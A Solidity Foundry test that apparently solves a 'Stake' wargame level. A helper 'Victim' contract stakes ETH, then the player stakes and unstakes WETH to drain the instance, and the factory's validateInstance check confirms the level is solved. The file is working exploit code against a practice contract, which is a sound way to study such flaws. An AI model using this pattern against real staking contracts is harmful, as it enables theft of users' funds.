// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./StakeFactory.sol";

contract StakeExploitTest is Test {
    function test() public {
        address playerAddress = makeAddr("player");
        vm.deal(playerAddress, 1 ether);
        StakeFactory factory = new StakeFactory();
        address instanceAddress = factory.createInstance(playerAddress);

        vm.startPrank(playerAddress, playerAddress);

        new Victim{value: 0.003 ether}(instanceAddress);

        Stake instance = Stake(instanceAddress);
        ERC20(instance.WETH()).approve(address(instance), type(uint256).max);

        instance.StakeWETH(0.002 ether);
        instance.Unstake(0.002 ether);

        vm.stopPrank();

        assertTrue(factory.validateInstance(payable(instanceAddress), playerAddress), "Invalid Instance");
    }
}

contract Victim {
    constructor(address instanceAddress) payable {
        Stake instance = Stake(instanceAddress);
        instance.StakeETH{value: msg.value}();
    }
}
